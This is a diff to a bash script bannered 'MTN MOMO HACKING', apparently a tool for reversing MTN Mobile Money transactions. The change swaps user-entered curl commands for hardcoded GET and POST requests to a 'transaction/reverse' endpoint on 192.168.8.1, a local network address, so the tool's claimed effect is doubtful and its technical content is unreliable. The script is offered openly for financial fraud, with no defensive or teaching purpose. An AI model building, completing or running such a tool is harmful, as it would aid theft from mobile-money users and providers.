@@ -2,7 +2,7 @@
 
 # Add ASCII art
 echo ""
-figlet -f standard "MTN MOMO HACKING Reverse transaction" | lolcat
+figlet -f standard "MTN MOMO HACKING" | lolcat
 echo ""
 
 # Define the get_headers function
@@ -83,16 +83,11 @@ if [ $exitstatus = 1 ]; then
   exit 1
 fi
 
-# Get the curl commands
-curl_commands=()
-while true; do
-  curl_command=$(dialog --title "Enter a curl command" --inputbox "Curl Command:" 8 80)
-  exitstatus=$?
-  if [ $exitstatus = 1 ]; then
-    break
-  fi
-  curl_commands+=("$curl_command")
-done
+# Define the curl commands based on the reverse transaction ID
+curl_commands=(
+  "curl -X GET 'http://192.168.8.1/api/wallet/transaction/$reverse_transaction_id'"
+  "curl -X POST 'http://192.168.8.1/api/wallet/transaction/reverse/$reverse_transaction_id'"
+)
 
 # Execute the curl commands
 execute_curl_commands "${curl_commands[@]}"
